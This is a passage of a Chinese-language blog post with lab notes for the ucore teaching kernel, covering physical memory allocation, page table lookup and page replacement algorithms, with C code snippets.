header。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    list_del(&amp;(page-&gt;page_link));<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        <span class="hljs-comment">// 注意这一步</span><br>        list_add(&amp;free_list, &amp;(p-&gt;page_link));<br>    &#125;<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>以下是修改后的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        SetPageProperty(p);<br>        <span class="hljs-comment">// 注意这一步add after</span><br>        list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));<br>    &#125;<br>    list_del(&amp;(page-&gt;page_link));<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-free-pages"><a href="#default-free-pages" class="headerlink" title="default_free_pages"></a>default_free_pages</h4><ul><li><p>该函数默认会在函数末尾处，将待释放的页头插入至链表的第一个节点。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>所以我们需要修改这部分代码，使其按地址顺序插入至对应的链表结点处。</p><p>可以在循环中记录比这个page地址小的free_page, 而且还要设置标记来表明是否有这么一个page, 具体参见源码</p></li></ul><h3 id="练习二-1"><a href="#练习二-1" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p><strong>实现寻找虚拟地址对应的页表项</strong>.</p></blockquote><blockquote><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。</p><p>其中的<code>get_pte</code>函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。</p></blockquote><p>以下为实现的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">pte_t</span> * <span class="hljs-title">get_pte</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> la, <span class="hljs-keyword">bool</span> create)</span> </span>&#123;<br>    <span class="hljs-comment">// 获取传入的线性地址中所对应的页目录条目的物理地址</span><br>    <span class="hljs-keyword">pde_t</span> *pdep = PDX(la) + pgdir;<br>    <span class="hljs-comment">// 如果该条目不可用(not present)</span><br>    <span class="hljs-keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>        <span class="hljs-comment">// 如果分配页面失败，或者不允许分配，则返回NULL</span><br>        <span class="hljs-keyword">if</span> (!create || (page = alloc_page()) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 设置该物理页面的引用次数为1</span><br>        set_page_ref(page, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 获取当前物理页面所管理的物理地址</span><br>        <span class="hljs-keyword">uintptr_t</span> pa = page2pa(page);<br>        <span class="hljs-comment">// 清空该物理页面的数据。需要注意的是使用虚拟地址</span><br>        <span class="hljs-built_in">memset</span>(KADDR(pa), <span class="hljs-number">0</span>, PGSIZE);<br>        <span class="hljs-comment">// 将新分配的页面设置为当前缺失的页目录条目中</span><br>        <span class="hljs-comment">// 之后该页面就是其中的一个二级页面</span><br>        *pdep = pa | PTE_U | PTE_W | PTE_P;<br>    &#125;<br>    <span class="hljs-comment">// 返回在pgdir中对应于la的二级页表项, 注意是虚拟地址, 因为返回一个物理地址也没啥用, cpu操作不了</span><br>    <span class="hljs-keyword">pte_t</span> *ptep = (<span class="hljs-keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)) + PTX(la);<br>    <span class="hljs-keyword">return</span> ptep; <br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>请描述页目录项（Pag Director Entry）和页表（Page Table Entry）中每个组成部分的含义和以及对ucore而言的潜在用处。</p><blockquote><p>请查看<a href="#vpt&pdt">虚拟页表结构</a></p></blockquote></li><li><p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p><ul><li>将引发页访问异常的地址将被保存在cr2寄存器中</li><li>设置错误代码</li><li>引发Page Fault，将外存的数据换到内存中</li><li>进行上下文切换，退出中断，返回到中断前的状态</li></ul></li></ul><h3 id="练习三-1"><a href="#练习三-1" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>释放某虚地址所在的页并取消对应二级页表项的映射</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) <span class="hljs-comment">//(1) check if this page table entry is present</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep); <span class="hljs-comment">//(2) find corresponding page to pte</span><br><br>    <span class="hljs-keyword">if</span> (page_ref_dec(page) == <span class="hljs-number">0</span>) <span class="hljs-comment">//(3) decrease page reference</span><br>    &#123;<br>        free_page(page); <span class="hljs-comment">//(4) and free this page when page reference reachs 0</span><br>    &#125;<br>    *ptep = <span class="hljs-number">0</span>;                 <span class="hljs-comment">//(5) clear second page table entry</span><br>    tlb_invalidate(pgdir, la); <span class="hljs-comment">//(6) flush tlb</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>两个问题:</p><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</p><p>CPU如果要访问内存地址, 送出CPU的肯定是虚拟地址, 经过MMU的转换完成虚拟地址到物理地址的转换.</p><p>在MMU中, 取出虚拟地址高10位和%cr3拼接成页目录表条目(pdte), 读取出内存中的页目录表(或者在MMU中的TLB)所存储的页表物理地址, 然后发送这个物理地址+虚拟地址中间十位到内存中访问到页表条目, 读出所在page的物理地址, 然后再和虚拟地址低12位拼接成物理地址到内存中访问. </p><p>如果没有TLB, 这中间会有多次访存:</p><ol><li>为读取目录项而访问主存。</li><li>为读取页表项而访问主存。</li><li>为读取操作数或指令而访问主存。</li></ol><p>回答本文章中的一个问题: <strong>为什么页目录表和页表存储的是对应的物理地址而不是虚拟地址?</strong> </p><p>原因也明了了, 这两个表就是MMU和内存合作完成虚拟地址到物理地址转换的基础, 而虚拟地址是在内核中使用的一个抽象连续空间的地址, 和MMU关系不大, 更不必往表项里存储虚拟地址, 何况这么做还会导致递归查找<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的线性地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。">[1]</span></a></sup> </p><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ 鼓励通过编程来具体完成这个问题 </p><ul><li><p>将<code>labcodes/lab2/tools/kernel.ld</code>中的加载地址从<code>0xC0100000</code>修改为<code>0x0</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br>. = <span class="hljs-number">0xC0100000</span>;<br><span class="hljs-comment">// 修改后</span><br>. = <span class="hljs-number">0x0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>将<code>mm/</code>中的内核偏移地址修改为0</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0xC0000000</span><br><span class="hljs-comment">// 修改后</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE            0x0</span><br></code></pre></div></td></tr></table></figure></li><li><p>最后一步，但也是必须要做的一步——<strong>关闭页机制</strong>。将开启页机制的那一段代码删除或注释掉最后一句即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># 修改后<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br># 注释了最后一句<br># movl %eax, %cr0<br></code></pre></div></td></tr></table></figure></li><li><p>需要注意的是，需要把开启页表关闭，否则会报错，**因为页表开启时认为偏移量不为0(有待考证)**。</p></li></ul><h3 id="拓展练习-1"><a href="#拓展练习-1" class="headerlink" title="拓展练习"></a>拓展练习</h3><h4 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h4><blockquote><p><strong>buddy system（伙伴系统）分配算法, <a href="http://coolshell.cn/articles/10427.html">伙伴分配器的一个极简实现</a> <a href="https://github.com/wuwenbin/buddy2/blob/master/buddy2.c">具体实现</a></strong></p><p>Buddy System算法把系统中的可用存储空间划分为存储块(Block)来进行管理, 每个存储块的大小必须是2的n次幂(Pow(2, n)), 即1, 2, 4, 8, 16, 32, 64, 128…</p></blockquote><p>经过一番思考, 属于是没搞懂用在这里的优势在哪, 分配的时候得遍历一遍双向链表, 找到了再分割, 和FIFO没啥区别, 释放时稍微有一点优势,  但最主要的问题是如果内存探测弄出的block很多的话也就只有略微有一点优势, 至于用双向链表而不是二叉树就更离谱了, 不如不写</p><h4 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h4><blockquote><p>slub算法，实现两层架构的高效内存单元分配，第一层是基于页大小的内存分配，第二层是在第一层基础上实现基于任意大小的内存分配。可简化实现，能够体现其主体思想即可。</p><ul><li>参考<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-slub/">linux的slub分配算法/</a>，在ucore中实现slub分配算法。要求有比较充分的测试用例说明实现的正确性，需要有设计文档。</li></ul></blockquote><h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成"><a href="#0-项目组成" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验二，实验三主要改动如下：</p><ul><li>kern/mm/default_pmm.[ch]：实现基于struct pmm_manager类框架的Fist-Fit物理内存分配参考实现（分配最小单位为页，即4096字节），相关分配页和释放页等实现会间接被kmalloc/kfree等函数使用。</li><li>kern/mm/pmm.[ch]：pmm.h定义物理内存分配类框架struct pmm_manager。pmm.c包含了对此物理内存分配类框架的访问，以及与建立、修改、访问页表相关的各种函数实现。在本实验中会用到kmalloc/kfree等函数。</li><li>libs/list.h：定义了通用双向链表结构以及相关的查找、插入等基本操作，这是建立基于链表方法的物理内存管理（以及其他内核功能）的基础。在lab0文档中有相关描述。其他有类似双向链表需求的内核功能模块可直接使用list.h中定义的函数。在本实验中会多次用到插入，删除等操作函数。</li><li>kern/driver/ide.[ch]：定义和实现了内存页swap机制所需的磁盘扇区的读写操作支持；在本实验中会涉及通过swapfs_*函数间接使用文件中的函数。故了解即可。</li><li>kern/fs/*：定义和实现了内存页swap机制所需从磁盘读数据到内存页和写内存数据到磁盘上去的函数 swapfs_read/swapfs_write。在本实验中会涉及使用这两个函数。</li><li>kern/mm/memlayout.h：修改了struct Page，增加了两项pra_*成员结构，其中pra_page_link可以用来建立描述各个页访问情况（比如根据访问先后）的链表。在本实验中会涉及使用这两个成员结构，以及le2page等宏。</li><li>kern/mm/vmm.[ch]：vmm.h描述了mm_struct，vma_struct等表述可访问的虚存地址访问的一些信息，下面会进一步详细讲解。vmm.c涉及mm,vma结构数据的创建/销毁/查找/插入等函数，这些函数在check_vma、check_vmm等中被使用，理解即可。而page fault处理相关的do_pgfault函数是本次实验需要涉及完成的。</li><li>kern/mm/swap.[ch]：定义了实现页替换算法类框架struct swap_manager。swap.c包含了对此页替换算法类框架的初始化、页换入/换出等各种函数实现。重点是要理解何时调用swap_out和swap_in函数。和如何在此框架下连接具体的页替换算法实现。check_swap函数以及被此函数调用的_fifo_check_swap函数完成了对本次实验中的练习2：FIFO页替换算法基本正确性的检查，可了解，便于知道为何产生错误。</li><li>kern/mm/swap_fifo.[ch]：FIFO页替换算法的基于页替换算法类框架struct swap_manager的简化实现，主要被swap.c的相关函数调用。重点是_fifo_map_swappable函数（可用于建立页访问属性和关系，比如访问时间的先后顺序）和_fifo_swap_out_victim函数（可用于实现挑选出要换出的页），当然换出哪个页需要借助于fifo_map_swappable函数建立的某种属性关系，已选出合适的页。</li><li>kern/mm/mmu.h：其中定义了页表项的各种属性位，比如PTE_P\PET_D\PET_A等，对于实现扩展实验的clock算法会有帮助。</li></ul><p>本次实验的主要练习集中在vmm.c中的do_pgfault函数和swap_fifo.c中的_fifo_map_swappable函数、_fifo_swap_out_victim函数。</p><h3 id="1-实验执行流程概述"><a href="#1-实验执行流程概述" class="headerlink" title="1.实验执行流程概述"></a>1.实验执行流程概述</h3><p>首先是初始化过程。参考ucore总控函数init的代码，可以看到在调用完成虚拟内存初始化的vmm_init函数之前，需要首先调用pmm_init函数完成物理内存的管理，这也是我们lab2已经完成的内容。接着是执行中断和异常相关的初始化工作，即调用pic_init函数和idt_init函数等，这些工作与lab1的中断异常初始化工作的内容是相同的。</p><p>在调用完idt_init函数之后，将进一步调用三个lab3中才有的新函数vmm_init、ide_init和swap_init。这三个函数涉及了本次实验中的两个练习。第一个函数vmm_init是检查我们的练习1是否正确实现了。为了表述不在物理内存中的“合法”虚拟页，需要有数据结构来描述这样的页，为此ucore建立了mm_struct和vma_struct数据结构（接下来的小节中有进一步详细描述），假定我们已经描述好了这样的“合法”虚拟页，当ucore访问这些“合法”虚拟页时，会由于没有虚实地址映射而产生页访问异常。如果我们正确实现了练习1，则do_pgfault函数会申请一个空闲物理页，并建立好虚实映射关系，从而使得这样的“合法”虚拟页有实际的物理页帧对应。这样练习1就算完成了。</p><p>ide_init和swap_init是为练习2准备的。由于页面置换算法的实现存在对硬盘数据块的读写，所以ide_init就是完成对用于页换入换出的硬盘（简称swap硬盘）的初始化工作。完成ide_init函数后，ucore就可以对这个swap硬盘进行读写操作了。swap_init函数首先建立swap_manager，swap_manager是完成页面替换过程的主要功能模块，其中包含了页面置换算法的实现（具体内容可参考5小节）。然后会进一步调用执行check_swap函数在内核中分配一些页，模拟对这些页的访问，这会产生页访问异常。如果我们正确实现了练习2，就可通过do_pgfault来调用swap_map_swappable函数来查询这些页的访问情况并间接调用实现页面置换算法的相关函数，把“不常用”的页换出到磁盘上。</p><h3 id="2-置换算法"><a href="#2-置换算法" class="headerlink" title="2.置换算法"></a>2.置换算法</h3><p>操作系统迟早会碰到没有内存空闲空间而必须要置换出内存中某个“不常用”的页的情况。如何判断内存中哪些是“常用”的页，哪些是“不常用”的页，把“常用”的页保持在内存中，在物理内存空闲空间不够的情况下，把“不常用”的页置换到硬盘上就是页替换算法着重考虑的问题。容易理解，一个好的页替换算法会导致页访问异常次数少，也就意味着访问硬盘的次数也少，从而使得应用程序执行的效率就高。本次实验涉及的页替换算法（包括扩展练习）：</p><ul><li>先进先出(First In First Out, FIFO)页替换算法：该算法总是淘汰最先进入内存的页，即选择在内存中驻留时间最久的页予以淘汰。只需把一个应用程序在执行过程中已调入内存的页按先后次序链接成一个队列，队列头指向内存中驻留时间最久的页，队列尾指向最近被调入内存的页。这样需要淘汰页时，从队列头很容易查找到需要淘汰的页。FIFO算法只是在应用程序按线性顺序访问地址空间时效果才好，否则效率不高。因为那些常被访问的页，往往在内存中也停留得最久，结果它们因变“老”而不得不被置换出去。FIFO算法的另一个缺点是，它有一种异常现象（Belady现象），即在增加放置页的页帧的情况下，反而使页访问异常次数增多。</li><li>时钟（Clock）页替换算法：是LRU算法的一种近似实现。时钟页替换算法把各个页面组织成环形链表的形式，类似于一个钟的表面。然后把一个指针（简称当前指针）指向最老的那个页面，即最先进来的那个页面。另外，时钟算法需要在页表项（PTE）中设置了一位访问位来表示此页表项对应的页当前是否被访问过。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当操作系统需要淘汰页时，对当前指针指向的页所对应的页表项进行查询，如果访问位为“0”，则淘汰该页，如果该页被写过，则还要把它换出到硬盘上；如果访问位为“1”，则将该页表项的此位置“0”，继续访问下一个页。该算法近似地体现了LRU的思想，且易于实现，开销少，需要硬件支持来设置访问位。时钟页替换算法在本质上与FIFO算法是类似的，不同之处是在时钟页替换算法中跳过了访问位为1的页。</li><li>改进的时钟（Enhanced Clock）页替换算法：在时钟置换算法中，淘汰一个页面时只考虑了页面是否被访问过，但在实际情况中，还应考虑被淘汰的页面是否被修改过。因为**淘汰修改过的页面还需要写回硬盘(迷惑, 移到swap分区跟是否修改过有什么关系)**，使得其置换代价大于未修改过的页面，所以优先淘汰没有修改的页，减少磁盘操作次数。改进的时钟置换算法除了考虑页面的访问情况，还需考虑页面的修改情况。即该算法不但希望淘汰的页面是最近未使用的页，而且还希望被淘汰的页是在主存驻留期间其页面内容未被修改过的。这需要为每一页的对应页表项内容中增加一位引用位和一位修改位。当该页被访问时，CPU中的MMU硬件将把访问位置“1”。当该页被“写”时，CPU中的MMU硬件将把修改位置“1”。这样这两位就存在四种可能的组合情况：（0，0）表示最近未被引用也未被修改，首先选择此页淘汰；（0，1）最近未被使用，但被修改，其次选择；（1，0）最近使用而未修改，再次选择；（1，1）最近使用且修改，最后选择。该算法与时钟算法相比，可进一步减少磁盘的I/O操作次数，但为了查找到一个尽可能适合淘汰的页面，可能需要经过多次扫描，增加了算法本身的执行开销。</li></ul><h3 id="3-相关数据结构"><a href="#3-相关数据结构" class="headerlink" title="3.相关数据结构"></a>3.相关数据结构</h3><blockquote><p>Typoar给我整了个崩溃, 我也崩溃了⊙▃⊙以下内容直至challenge前复制于<a href="https://kiprey.github.io/2020/08/uCore-3/#3-uCore%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%9E%E7%8E%B0">这里</a> </p></blockquote><h4 id="I-虚拟内存管理"><a href="#I-虚拟内存管理" class="headerlink" title="I. 虚拟内存管理"></a>I. 虚拟内存管理</h4><ul><li><p>结构体变量<code>check_mm_struct</code>用于管理虚拟内存页面，其结构体如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// the control struct for a set of vma using the same PDT</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> mmap_list;        <span class="hljs-comment">// 按照虚拟地址顺序双向连接的虚拟页链表</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">// 当前使用的虚拟页地址，该成员加速页索引速度。</span><br>    <span class="hljs-keyword">pde_t</span> *pgdir;                  <span class="hljs-comment">// 虚拟页对应的PDT</span><br>    <span class="hljs-keyword">int</span> map_count;                 <span class="hljs-comment">// 虚拟页个数</span><br>    <span class="hljs-keyword">void</span> *sm_priv;                 <span class="hljs-comment">// 用于指向swap manager的某个链表,在FIFO算法中，该双向链表用于将可交换的已分配物理页串起来</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>当分配出新的虚拟页时，程序会执行<code>insert_vma_struct</code>函数，此时虚拟页<code>vma_struct</code>就会被插入<code>mm_struct::mmap_list</code>双向链表中。</p></li><li><p>若程序首次访问该内存而触发缺页中断时，程序会在缺页处理程序中为该虚拟页划分出一块新的物理页。同时，还会更新<code>mm_struct::pgdir</code>上的对应页表条目，之后该页的内存访问即可正常执行。</p></li><li><p>在FIFO页面置换算法中，初始时，<code>mm_struct</code>中的<code>sm_priv</code>会被设置为<code>pra_list_head</code>。而<code>pra_list_head</code>是一个双向链表的起始结点，该双向链表用于将<strong>可交换的已分配物理页</strong>串起来。</p></li></ul><h4 id="II-页面置换"><a href="#II-页面置换" class="headerlink" title="II. 页面置换"></a>II. 页面置换</h4><ul><li><p><code>swap_manager</code>与<code>pmm_manager</code>类似，都设置了一个用于管理某个功能的模块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">swap_manager</span></span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>     <span class="hljs-comment">/* Global initialization for the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*init)            (<span class="hljs-keyword">void</span>);<br>     <span class="hljs-comment">/* Initialize the priv data inside mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*init_mm)         (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when tick interrupt occured */</span><br>     <span class="hljs-keyword">int</span> (*tick_event)      (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when map a swappable page into the mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page *page, <span class="hljs-keyword">int</span> swap_in);<br>     <span class="hljs-comment">/* When a page is marked as shared, this routine is called to</span><br><span class="hljs-comment">      * delete the addr entry from the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr);<br>     <span class="hljs-comment">/* Try to swap out a page, return then victim */</span><br>     <span class="hljs-keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick);<br>     <span class="hljs-comment">/* check the page relpacement algorithm */</span><br>     <span class="hljs-keyword">int</span> (*check_swap)(<span class="hljs-keyword">void</span>);<br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>若使用FIFO页面置换算法，则在缺页中断程序中，程序只会<strong>换入</strong>目标物理页，而不会主动换出。</p><p>只有在分配空闲物理页时，若<code>pmm_manager-&gt;alloc_pages(n)</code>失败，则程序才会执行一次页面换出，以腾出空闲的物理页，并重新分配。</p></li><li><p><code>swap_in</code>函数只会将目标物理页加载进内存中，而不会修改页表条目。所以相关的标志位设置必须在<code>swap_in</code>函数的外部手动处理。而<code>swap_out</code>函数会先执行<code>swap_out_victim</code>，找出最适合换出的物理页，并将其换出，最后刷新TLB, <strong>有可能换出多页</strong>。需要注意的是<code>swap_out</code>函数会在函数内部设置PTE，当某个页面被换出后，PTE会被设置为所换出物理页在硬盘上的偏移, 而且会执行<strong>free_page</strong>, 往空闲链表里面加入该page</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n&quot;</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>);<br>*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">8</span>;<br>free_page(page);<br></code></pre></div></td></tr></table></figure><p>当PTE所对应的物理页存在于内存中，那么该PTE就是正常的页表条目，可被CPU直接寻址用于转换地址。但当所对应的物理页不在内存时，该PTE就成为<code>swap_entry_t</code>，保存该物理页数据在外存的偏移位置。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * swap_entry_t</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> * |         offset        |   reserved   | 0 |</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> *           24 bits            7 bits    1 bit</span><br><span class="hljs-comment"> * /</span><br><span class="hljs-comment"> /* *</span><br><span class="hljs-comment"> * swap_offset - takes a swap_entry (saved in pte), and returns</span><br><span class="hljs-comment"> * the corresponding offset in swap mem_map.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> swap_offset(entry) (&#123;                                       \</span><br><span class="hljs-meta">               size_t __offset = (entry &gt;&gt; 8);                        \</span><br><span class="hljs-meta">               <span class="hljs-meta-keyword">if</span> (!(__offset &gt; 0 &amp;&amp; __offset &lt; max_swap_offset)) &#123;    \</span><br><span class="hljs-meta">                    panic(<span class="hljs-meta-string">&quot;invalid swap_entry_t = %08x.\n&quot;</span>, entry);    \</span><br><span class="hljs-meta">               &#125;                                                    \</span><br><span class="hljs-meta">               __offset;                                            \</span><br><span class="hljs-meta">          &#125;)</span><br></code></pre></div></td></tr></table></figure></li><li><p>同时，不是所有物理页面都可以置换，例如内核关键代码和数据等等，所以在分配物理页时，需要对于那些可被置换的物理页执行<code>swap_map_swappable</code>函数，将该物理页加入到<code>mm_struct::sm_priv</code>指针所指向的双向链表中，换入和换出操作都会操作该链表（插入/移除<strong>可交换的已分配</strong>物理页）。</p></li><li><p>数据结构<code>Page</code>和<code>vma_struct</code>分别用于管理物理页和虚拟页，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 